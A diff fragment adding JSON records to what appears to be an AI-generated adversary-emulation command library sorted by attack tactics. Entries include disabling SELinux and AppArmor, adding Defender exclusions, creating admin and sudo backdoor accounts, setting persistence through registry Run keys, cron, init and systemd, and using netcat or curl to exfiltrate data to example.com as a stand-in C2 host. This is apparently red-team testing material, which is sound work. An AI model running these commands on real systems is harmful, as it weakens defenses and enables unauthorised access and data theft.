+      "command": "sudo setenforce 0",
+      "description": "Disable SELinux enforcement to impair defenses",
+      "requires_admin": true,
+      "safety_level": "medium",
+      "expected_behavior": "SELinux enforcement will be disabled, potentially allowing malicious activities to go undetected.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:47:11.193811",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.704,
+      "validated": true
+    },
+    {
+      "id": "6b9abfcd-5960-4f00-9665-ea23b9d67da8",
+      "ttp_id": "2260f1e8-3ce7-4851-99af-d6a72e175807",
+      "technique_id": "2260f1e8-3ce7-4851-99af-d6a72e175807",
+      "technique_name": "Impair Defenses",
+      "tactic": "Defense Evasion",
+      "platform": "linux",
+      "command": "sudo apparmor_parser -R /etc/apparmor.d/*",
+      "description": "Reload AppArmor profiles to potentially impair its defense capabilities",
+      "requires_admin": true,
+      "safety_level": "low",
+      "expected_behavior": "AppArmor profiles will be reloaded, which could be used to impair its defenses if done maliciously.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:47:11.193811",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.704,
+      "validated": true
+    },
+    {
+      "id": "4e566146-9a6e-4b10-a6a8-025db4a7ac7f",
+      "ttp_id": "2260f1e8-3ce7-4851-99af-d6a72e175807",
+      "technique_id": "2260f1e8-3ce7-4851-99af-d6a72e175807",
+      "technique_name": "Impair Defenses",
+      "tactic": "Defense Evasion",
+      "platform": "linux",
+      "command": "sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1",
+      "description": "Modify kernel parameters to ignore ICMP echo requests, potentially impairing network defenses",
+      "requires_admin": true,
+      "safety_level": "medium",
+      "expected_behavior": "The system will ignore ICMP echo requests, which could be used to evade detection or impair network defenses.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:47:11.194826",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.704,
+      "validated": true
+    },
+    {
+      "id": "a7d9dbe1-d901-469c-bd4f-b3209fdd9c90",
+      "ttp_id": "a432c242-be46-496b-b530-a072b57d65b0",
+      "technique_id": "a432c242-be46-496b-b530-a072b57d65b0",
+      "technique_name": "Command and Scripting Interpreter",
+      "tactic": "Execution",
+      "platform": "windows",
+      "command": "net user testuser testpassword /add",
+      "description": "Create a new user named testuser with the password testpassword",
+      "requires_admin": true,
+      "safety_level": "medium",
+      "expected_behavior": "A new user named testuser is created with the specified password",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:41.023969",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.703,
+      "validated": true
+    },
+    {
+      "id": "81f25e30-8015-47b7-9921-a83aecfcd597",
+      "ttp_id": "a432c242-be46-496b-b530-a072b57d65b0",
+      "technique_id": "a432c242-be46-496b-b530-a072b57d65b0",
+      "technique_name": "Command and Scripting Interpreter",
+      "tactic": "Execution",
+      "platform": "windows",
+      "command": "net localgroup administrators testuser /add",
+      "description": "Add the newly created testuser to the local administrators group",
+      "requires_admin": true,
+      "safety_level": "medium",
+      "expected_behavior": "The testuser is added to the administrators group, granting elevated privileges",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:41.025086",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.703,
+      "validated": true
+    },
+    {
+      "id": "9f3947f5-8636-4340-9ce8-492572a8eefa",
+      "ttp_id": "a432c242-be46-496b-b530-a072b57d65b0",
+      "technique_id": "a432c242-be46-496b-b530-a072b57d65b0",
+      "technique_name": "Command and Scripting Interpreter",
+      "tactic": "Execution",
+      "platform": "windows",
+      "command": "powershell -Command \"New-LocalUser -Name testuser -Password (ConvertTo-SecureString -String 'testpassword' -AsPlainText -Force) -AccountNeverExpires\" && net localgroup administrators testuser /add",
+      "description": "Create a new user and add it to the administrators group using PowerShell, ensuring the account never expires",
+      "requires_admin": true,
+      "safety_level": "medium",
+      "expected_behavior": "A new user named testuser is created with the specified password, added to the administrators group, and configured to never expire",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:41.025086",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.703,
+      "validated": true
+    },
+    {
+      "id": "0512b5a9-cb45-43a5-b59a-b110054e0985",
+      "ttp_id": "a432c242-be46-496b-b530-a072b57d65b0",
+      "technique_id": "a432c242-be46-496b-b530-a072b57d65b0",
+      "technique_name": "Command and Scripting Interpreter",
+      "tactic": "Execution",
+      "platform": "linux",
+      "command": "sudo useradd -m testuser && sudo usermod -aG sudo testuser",
+      "description": "Create a new user and add them to the sudo group using the useradd and usermod commands",
+      "requires_admin": true,
+      "safety_level": "medium",
+      "expected_behavior": "A new user will be created and added to the sudo group, allowing them to execute commands with elevated privileges",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:42.531820",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.703,
+      "validated": true
+    },
+    {
+      "id": "8fddc94c-fcc8-4a16-8b02-79b3265e3c8b",
+      "ttp_id": "a432c242-be46-496b-b530-a072b57d65b0",
+      "technique_id": "a432c242-be46-496b-b530-a072b57d65b0",
+      "technique_name": "Command and Scripting Interpreter",
+      "tactic": "Execution",
+      "platform": "linux",
+      "command": "sudo bash -c 'useradd -m testuser && usermod -aG sudo testuser'",
+      "description": "Create a new user and add them to the sudo group using the bash shell and the useradd and usermod commands",
+      "requires_admin": true,
+      "safety_level": "medium",
+      "expected_behavior": "A new user will be created and added to the sudo group, allowing them to execute commands with elevated privileges",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:42.531820",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.703,
+      "validated": true
+    },
+    {
+      "id": "c4a0bdc9-1f16-4927-8f29-54fe9fe97b56",
+      "ttp_id": "a432c242-be46-496b-b530-a072b57d65b0",
+      "technique_id": "a432c242-be46-496b-b530-a072b57d65b0",
+      "technique_name": "Command and Scripting Interpreter",
+      "tactic": "Execution",
+      "platform": "linux",
+      "command": "sudo perl -e 'system(\"useradd -m testuser && usermod -aG sudo testuser\");'",
+      "description": "Create a new user and add them to the sudo group using the perl interpreter and the useradd and usermod commands",
+      "requires_admin": true,
+      "safety_level": "high",
+      "expected_behavior": "A new user will be created and added to the sudo group, allowing them to execute commands with elevated privileges",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:42.531820",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.703,
+      "validated": true
+    },
+    {
+      "id": "96f932b7-e34d-48cb-a988-2bc9da33d2cf",
+      "ttp_id": "5866b955-9c71-40f4-96d9-b825cef79783",
+      "technique_id": "5866b955-9c71-40f4-96d9-b825cef79783",
+      "technique_name": "Boot or Logon Autostart Execution",
+      "tactic": "Persistence",
+      "platform": "windows",
+      "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v test /t REG_SZ /d \"cmd.exe /c echo test > %TEMP%\\test.txt\" /f",
+      "description": "Adds a registry key to run a command at logon, writing to a temp file.",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "A new registry key is added under HKCU, and upon next logon, the command runs, creating a file in the temp directory.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:42.268686",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.699,
+      "validated": true
+    },
+    {
+      "id": "13bb3e68-a279-4ef7-9101-757baaee1d27",
+      "ttp_id": "5866b955-9c71-40f4-96d9-b825cef79783",
+      "technique_id": "5866b955-9c71-40f4-96d9-b825cef79783",
+      "technique_name": "Boot or Logon Autostart Execution",
+      "tactic": "Persistence",
+      "platform": "windows",
+      "command": "powershell -Command \"Add-MpPreference -ExclusionPath '%APPDATA%\\test'; echo 'test' > '%APPDATA%\\test\\test.txt'\"",
+      "description": "Adds an exclusion path to Windows Defender and creates a file within that path, demonstrating potential for malicious file persistence.",
+      "requires_admin": true,
+      "safety_level": "medium",
+      "expected_behavior": "An exclusion path is added to Windows Defender preferences, and a file is created within that path, which could potentially be used to host malicious content.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:42.268686",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.699,
+      "validated": true
+    },
+    {
+      "id": "f5480d34-991e-466c-b129-4040786fe757",
+      "ttp_id": "5866b955-9c71-40f4-96d9-b825cef79783",
+      "technique_id": "5866b955-9c71-40f4-96d9-b825cef79783",
+      "technique_name": "Boot or Logon Autostart Execution",
+      "tactic": "Persistence",
+      "platform": "windows",
+      "command": "schtasks /create /tn test /tr \"cmd.exe /c echo test > %TEMP%\\test_schtasks.txt\" /sc onstart",
+      "description": "Creates a scheduled task to run a command at system start, demonstrating persistence through scheduled tasks.",
+      "requires_admin": true,
+      "safety_level": "medium",
+      "expected_behavior": "A new scheduled task named 'test' is created, set to run at system start, which executes a command writing to a temp file.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:42.268686",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.699,
+      "validated": true
+    },
+    {
+      "id": "f67b21ae-e9a5-4498-9236-4c6752ece114",
+      "ttp_id": "5866b955-9c71-40f4-96d9-b825cef79783",
+      "technique_id": "5866b955-9c71-40f4-96d9-b825cef79783",
+      "technique_name": "Boot or Logon Autostart Execution",
+      "tactic": "Persistence",
+      "platform": "linux",
+      "command": "(echo -e '#!/bin/bash\\necho \\\"Persistence test\\\" >> /tmp/persist.log' > /tmp/persist.sh && chmod +x /tmp/persist.sh && (crontab -l 2>/dev/null; echo \"@reboot /tmp/persist.sh\") | crontab -)",
+      "description": "Creates a user\u2011level cron @reboot entry that runs a harmless script at system boot.",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "On the next system boot the script /tmp/persist.sh will execute, appending a line to /tmp/persist.log.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:50:30.155215",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.699,
+      "validated": true
+    },
+    {
+      "id": "780bfd98-081b-439e-aac7-ab1dff4d0150",
+      "ttp_id": "5866b955-9c71-40f4-96d9-b825cef79783",
+      "technique_id": "5866b955-9c71-40f4-96d9-b825cef79783",
+      "technique_name": "Boot or Logon Autostart Execution",
+      "tactic": "Persistence",
+      "platform": "linux",
+      "command": "echo -e '#!/bin/sh\\n### BEGIN INIT INFO\\n# Provides:          persist\\n# Required-Start:    $remote_fs $syslog\\n# Required-Stop:     $remote_fs $syslog\\n# Default-Start:     2 3 4 5\\n# Default-Stop:      0 1 6\\n# Short-Description: Persistence script\\n### END INIT INFO\\n\\ncase $1 in\\n start)\\n   /tmp/persist.sh &\\n   ;;\\n stop)\\n   pkill -f /tmp/persist.sh\\n   ;;\\n *)\\n   echo \\\\\\\"Usage: $0 {start|stop}\\\\\\\"\\n   exit 1\\n   ;;\\nesac\\n   exit 0' > /etc/init.d/persist && chmod +x /etc/init.d/persist && update-rc.d persist defaults && /etc/init.d/persist start",
+      "description": "Creates a SysV init script in /etc/init.d, registers it with update-rc.d, and starts it, providing persistence via the traditional init system.",
+      "requires_admin": true,
+      "safety_level": "medium",
+      "expected_behavior": "The init script runs /tmp/persist.sh at system boot (and is started immediately). The script logs a message, demonstrating persistence.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:50:30.156259",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.699,
+      "validated": true
+    },
+    {
+      "id": "5013d740-7296-4eda-bf70-817d574c1725",
+      "ttp_id": "474df3b7-7556-450a-bac3-58518353b856",
+      "technique_id": "474df3b7-7556-450a-bac3-58518353b856",
+      "technique_name": "Exfiltration Over Command and Control Channel",
+      "tactic": "Exfiltration",
+      "platform": "windows",
+      "command": "echo TestData > %TEMP%\\exfil_data.txt && certutil.exe -encode %TEMP%\\exfil_data.txt %TEMP%\\exfil_data.enc",
+      "description": "Basic exfiltration example: Encode data using certutil and prepare for transfer.",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "Creates an encoded file in the temp directory.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:47:11.156252",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.696,
+      "validated": true
+    },
+    {
+      "id": "4f592eb8-5f12-46a9-98c0-ac23a0d424d8",
+      "ttp_id": "474df3b7-7556-450a-bac3-58518353b856",
+      "technique_id": "474df3b7-7556-450a-bac3-58518353b856",
+      "technique_name": "Exfiltration Over Command and Control Channel",
+      "tactic": "Exfiltration",
+      "platform": "windows",
+      "command": "powershell.exe -Command \"'TestData' | Out-File -FilePath '%TEMP%\\exfil_data.txt' -Encoding utf8; Get-Content '%TEMP%\\exfil_data.txt' | Set-Content -Path '%TEMP%\\exfil_data.txt' -Encoding utf8\"",
+      "description": "Intermediate example: Use PowerShell to create and read data, simulating exfiltration preparation.",
+      "requires_admin": false,
+      "safety_level": "medium",
+      "expected_behavior": "Creates a file, writes to it, and then reads from it, demonstrating data handling.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:47:11.156252",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.696,
+      "validated": true
+    },
+    {
+      "id": "473e82be-bb14-467f-8dcf-60fffb1992b1",
+      "ttp_id": "474df3b7-7556-450a-bac3-58518353b856",
+      "technique_id": "474df3b7-7556-450a-bac3-58518353b856",
+      "technique_name": "Exfiltration Over Command and Control Channel",
+      "tactic": "Exfiltration",
+      "platform": "windows",
+      "command": "powershell.exe -Command \"[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('TestData')) | Out-File -FilePath '%TEMP%\\exfil_data.txt'\"",
+      "description": "Advanced example: Encode data directly in PowerShell and save to a file, simulating exfiltration data preparation.",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "Encodes data to Base64 and saves it to a file in the temp directory.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:47:11.156252",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.696,
+      "validated": true
+    },
+    {
+      "id": "704d2910-37ca-419d-9369-7704330ab748",
+      "ttp_id": "474df3b7-7556-450a-bac3-58518353b856",
+      "technique_id": "474df3b7-7556-450a-bac3-58518353b856",
+      "technique_name": "Exfiltration Over Command and Control Channel",
+      "tactic": "Exfiltration",
+      "platform": "linux",
+      "command": "echo 'exfiltrated_data' | nc example.com 8080",
+      "description": "Basic command using netcat to send data to a C2 server",
+      "requires_admin": false,
+      "safety_level": "medium",
+      "expected_behavior": "Sends the string 'exfiltrated_data' to the specified server and port, simulating exfiltration over a command and control channel",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:47:48.882043",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.696,
+      "validated": true
+    },
+    {
+      "id": "bc4b5a50-c86b-4158-9224-1f20e8e422f9",
+      "ttp_id": "474df3b7-7556-450a-bac3-58518353b856",
+      "technique_id": "474df3b7-7556-450a-bac3-58518353b856",
+      "technique_name": "Exfiltration Over Command and Control Channel",
+      "tactic": "Exfiltration",
+      "platform": "linux",
+      "command": "curl -X POST -d 'exfiltrated_data' http://example.com/exfiltrate",
+      "description": "Intermediate command using curl to send data to a C2 server via HTTP",
+      "requires_admin": false,
+      "safety_level": "medium",
+      "expected_behavior": "Sends the string 'exfiltrated_data' to the specified URL, simulating exfiltration over a command and control channel using HTTP",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:47:48.882043",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.696,
+      "validated": true
+    },
+    {
+      "id": "2a11e453-9b94-4245-bf9b-4e26324c186d",
+      "ttp_id": "474df3b7-7556-450a-bac3-58518353b856",
+      "technique_id": "474df3b7-7556-450a-bac3-58518353b856",
+      "technique_name": "Exfiltration Over Command and Control Channel",
+      "tactic": "Exfiltration",
+      "platform": "linux",
+      "command": "bash -c 'for i in {1..5}; do echo \"exfiltrated_data_$i\" | nc example.com 8080; sleep 1; done'",
+      "description": "Advanced command using a bash loop to send multiple pieces of data to a C2 server with a delay",
+      "requires_admin": false,
+      "safety_level": "medium",
+      "expected_behavior": "Sends multiple strings ('exfiltrated_data_1' to 'exfiltrated_data_5') to the specified server and port with a 1-second delay between each send, simulating persistent exfiltration over a command and control channel",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:47:48.882043",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.696,
+      "validated": true
+    },
+    {
+      "id": "89272908-413d-4c13-b1f8-f3f2103b2010",
+      "ttp_id": "68c7663e-1138-49f0-afb8-9f6d69d32ed5",
+      "technique_id": "68c7663e-1138-49f0-afb8-9f6d69d32ed5",
+      "technique_name": "Remote Services",
+      "tactic": "Lateral Movement",
+      "platform": "windows",
+      "command": "sc.exe create TestService binPath= \"C:\\\\Windows\\\\System32\\\\cmd.exe\"",
+      "description": "Create a new service named TestService that executes cmd.exe",
+      "requires_admin": true,
+      "safety_level": "medium",
+      "expected_behavior": "A new service named TestService is created and can be started or stopped using the 'net start' and 'net stop' commands.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:42.153672",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.694,
+      "validated": true
+    },
+    {
+      "id": "023bb628-be4b-4995-bf39-31ccfa60f55c",
+      "ttp_id": "68c7663e-1138-49f0-afb8-9f6d69d32ed5",
+      "technique_id": "68c7663e-1138-49f0-afb8-9f6d69d32ed5",
+      "technique_name": "Remote Services",
+      "tactic": "Lateral Movement",
+      "platform": "windows",
+      "command": "powershell -Command \"New-Service -Name TestService2 -BinaryPathName 'C:\\\\Windows\\\\System32\\\\cmd.exe'\"",
+      "description": "Create a new service named TestService2 using PowerShell",
+      "requires_admin": true,
+      "safety_level": "medium",
+      "expected_behavior": "A new service named TestService2 is created and can be managed using the 'Get-Service', 'Start-Service', and 'Stop-Service' cmdlets.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:42.153672",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.694,
+      "validated": true
+    },
+    {
+      "id": "d1add556-825d-441c-8363-75565d00cfb0",
+      "ttp_id": "68c7663e-1138-49f0-afb8-9f6d69d32ed5",
+      "technique_id": "68c7663e-1138-49f0-afb8-9f6d69d32ed5",
+      "technique_name": "Remote Services",
+      "tactic": "Lateral Movement",
+      "platform": "windows",
+      "command": "reg.exe add \"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\TestService3\" /v Description /t REG_SZ /d \"Test Service 3\" /f",
+      "description": "Modify the description of a service named TestService3 using the registry",
+      "requires_admin": true,
+      "safety_level": "low",
+      "expected_behavior": "The description of the TestService3 service is updated in the registry.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:42.153672",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.694,
+      "validated": true
+    },
+    {
+      "id": "f5f356fb-b907-49c1-899a-ffde28b1d9e7",
+      "ttp_id": "68c7663e-1138-49f0-afb8-9f6d69d32ed5",
+      "technique_id": "68c7663e-1138-49f0-afb8-9f6d69d32ed5",
+      "technique_name": "Remote Services",
+      "tactic": "Lateral Movement",
+      "platform": "linux",
+      "command": "ssh user@remote-host \"echo 'remote test'\"",
+      "description": "Basic remote service usage: Executes a simple command on a remote host via SSH, demonstrating lateral movement through a remote service.",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "The remote host prints 'remote test' to the local terminal, confirming successful remote command execution.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:51:15.661700",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.694,
+      "validated": true
+    },
+    {
+      "id": "4ae8bd6e-8df9-490a-a90b-3bc6b259b0f3",
+      "ttp_id": "68c7663e-1138-49f0-afb8-9f6d69d32ed5",
+      "technique_id": "68c7663e-1138-49f0-afb8-9f6d69d32ed5",
+      "technique_name": "Remote Services",
+      "tactic": "Lateral Movement",
+      "platform": "linux",
+      "command": "sudo systemd-run --unit=remote-test.service --description='Test transient service' /bin/sh -c \"echo 'service started' > /tmp/remote_service.log\"",
+      "description": "Intermediate remote service creation: Starts a transient systemd service that runs a benign command, showing how an attacker can allocate a service in the kernel space.",
+      "requires_admin": true,
+      "safety_level": "medium",
+      "expected_behavior": "A new systemd service named remote-test.service is created and runs, writing 'service started' to /tmp/remote_service.log.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:51:15.661700",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.694,
+      "validated": true
+    },
+    {
+      "id": "cae9c64e-f4a6-498e-989d-9fabecf9c983",
+      "ttp_id": "68c7663e-1138-49f0-afb8-9f6d69d32ed5",
+      "technique_id": "68c7663e-1138-49f0-afb8-9f6d69d32ed5",
+      "technique_name": "Remote Services",
+      "tactic": "Lateral Movement",
+      "platform": "linux",
+      "command": "sudo bash -c \"cat > /etc/systemd/system/remote-evil.service <<'EOF'\n[Unit]\nDescription=Benign remote service test\n[Service]\nExecStart=/usr/bin/logger 'Remote service executed'\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl daemon-reload && systemctl enable --now remote-evil.service\"",
+      "description": "Advanced persistent service deployment: Writes a custom systemd unit file to /etc/systemd/system, reloads the daemon, enables and starts the service, illustrating creation of a remote service that persists across reboots.",
+      "requires_admin": true,
+      "safety_level": "medium",
+      "expected_behavior": "A new persistent service named remote-evil.service is installed, started, and logs 'Remote service executed' via the system logger.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:51:15.662725",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.694,
+      "validated": true
+    },
+    {
+      "id": "ab933c06-b89c-41d7-8f6f-920659690ada",
+      "ttp_id": "07966540-88e6-4530-a01c-0f269bf9e2bc",
+      "technique_id": "07966540-88e6-4530-a01c-0f269bf9e2bc",
+      "technique_name": "Application Window Discovery",
+      "tactic": "Discovery",
+      "platform": "windows",
+      "command": "tasklist | findstr winlogon.exe",
+      "description": "List running processes and filter for winlogon.exe",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "Lists winlogon.exe if it's running",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:37.321799",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.684,
+      "validated": true
+    },
+    {
+      "id": "4deca275-cce2-4e31-99be-4501540d360b",
+      "ttp_id": "07966540-88e6-4530-a01c-0f269bf9e2bc",
+      "technique_id": "07966540-88e6-4530-a01c-0f269bf9e2bc",
+      "technique_name": "Application Window Discovery",
+      "tactic": "Discovery",
+      "platform": "windows",
+      "command": "powershell -Command \"Get-Process -Name winlogon -ErrorAction SilentlyContinue; if ($?) { Write-Host 'winlogon.exe is running' }\"",
+      "description": "Use PowerShell to check if winlogon.exe is running and execute a command if it is",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "Prints 'winlogon.exe is running' to the console if winlogon.exe is running",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:37.322348",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.684,
+      "validated": true
+    },
+    {
+      "id": "ccbf39e4-089d-4a1f-8353-d838f18c1ef5",
+      "ttp_id": "07966540-88e6-4530-a01c-0f269bf9e2bc",
+      "technique_id": "07966540-88e6-4530-a01c-0f269bf9e2bc",
+      "technique_name": "Application Window Discovery",
+      "tactic": "Discovery",
+      "platform": "windows",
+      "command": "powershell -Command \"& { $pid = (Get-Process -Name winlogon).Id; Start-Process -FilePath cmd.exe -ArgumentList '/c echo winlogon.exe process ID: $pid' }\"",
+      "description": "Execute a command in the context of winlogon.exe using its process ID",
+      "requires_admin": true,
+      "safety_level": "medium",
+      "expected_behavior": "Opens a new command prompt window displaying the process ID of winlogon.exe",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:37.322348",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.684,
+      "validated": true
+    },
+    {
+      "id": "cc9de0ae-e9db-4511-8190-a0cddb11ca46",
+      "ttp_id": "07966540-88e6-4530-a01c-0f269bf9e2bc",
+      "technique_id": "07966540-88e6-4530-a01c-0f269bf9e2bc",
+      "technique_name": "Application Window Discovery",
+      "tactic": "Discovery",
+      "platform": "linux",
+      "command": "xwininfo -root -children",
+      "description": "Lists all windows on the screen, including their IDs and geometries.",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "Displays information about all windows on the screen.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:39.766081",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.684,
+      "validated": true
+    },
+    {
+      "id": "9c298ad1-16ff-4e7f-86e9-2036158b4aff",
+      "ttp_id": "07966540-88e6-4530-a01c-0f269bf9e2bc",
+      "technique_id": "07966540-88e6-4530-a01c-0f269bf9e2bc",
+      "technique_name": "Application Window Discovery",
+      "tactic": "Discovery",
+      "platform": "linux",
+      "command": "xdotool search --onlyvisible --class firefox",
+      "description": "Searches for visible windows with the class 'firefox'.",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "Returns the window IDs of visible Firefox windows.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:39.766081",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.684,
+      "validated": true
+    },
+    {
+      "id": "4834060b-96b7-4456-94b0-729a4d9650e8",
+      "ttp_id": "07966540-88e6-4530-a01c-0f269bf9e2bc",
+      "technique_id": "07966540-88e6-4530-a01c-0f269bf9e2bc",
+      "technique_name": "Application Window Discovery",
+      "tactic": "Discovery",
+      "platform": "linux",
+      "command": "wmctrl -l",
+      "description": "Lists all windows managed by the window manager, including their IDs and titles.",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "Displays a list of managed windows with their IDs and titles.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:39.766081",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.684,
+      "validated": true
+    },
+    {
+      "id": "5eb5c9ea-83de-49f7-a702-9a5fb0f90fe2",
+      "ttp_id": "7d99645f-a9b2-443b-be6a-776f83d45dc2",
+      "technique_id": "7d99645f-a9b2-443b-be6a-776f83d45dc2",
+      "technique_name": "Input Capture",
+      "tactic": "Collection",
+      "platform": "windows",
+      "command": "certutil -decode -f %TEMP%\\api_address.txt %TEMP%\\api_address_decoded.txt",
+      "description": "Decode a Base64 encoded string representing a simulated API function address using certutil.",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "The command decodes the Base64 string and saves it to a new file, simulating the collection of API function addresses.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:41.553945",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.683,
+      "validated": true
+    },
+    {
+      "id": "7806bed3-a21c-4ff8-ad4b-7ecef3cafd2b",
+      "ttp_id": "7d99645f-a9b2-443b-be6a-776f83d45dc2",
+      "technique_id": "7d99645f-a9b2-443b-be6a-776f83d45dc2",
+      "technique_name": "Input Capture",
+      "tactic": "Collection",
+      "platform": "windows",
+      "command": "powershell -Command \"Add-Content -Path %TEMP%\\import_table.txt -Value 'Simulated API Function Address: 0x12345678'\"",
+      "description": "Use PowerShell to add a simulated API function address to a file, mimicking the creation of an import table.",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "The command appends the simulated API function address to the specified file, demonstrating the creation of an import table.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:41.553945",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.683,
+      "validated": true
+    },
+    {
+      "id": "915256a1-28fd-4089-bc93-57d09f167c97",
+      "ttp_id": "7d99645f-a9b2-443b-be6a-776f83d45dc2",
+      "technique_id": "7d99645f-a9b2-443b-be6a-776f83d45dc2",
+      "technique_name": "Input Capture",
+      "tactic": "Collection",
+      "platform": "windows",
+      "command": "powershell -Command \"Get-Content -Path %TEMP%\\import_table.txt | Set-Content -Path %TEMP%\\import_table_final.txt -Encoding UTF8\"",
+      "description": "Read the import table file, and then save its content to a new file using UTF8 encoding, simulating further manipulation of the collected API information.",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "The command reads the import table, and then saves it to a new file with UTF8 encoding, demonstrating the manipulation of the collected data.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:41.553945",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.683,
+      "validated": true
+    },
+    {
+      "id": "6ab37d74-2eea-4896-890f-8e80373ff25f",
+      "ttp_id": "7d99645f-a9b2-443b-be6a-776f83d45dc2",
+      "technique_id": "7d99645f-a9b2-443b-be6a-776f83d45dc2",
+      "technique_name": "Input Capture",
+      "tactic": "Collection",
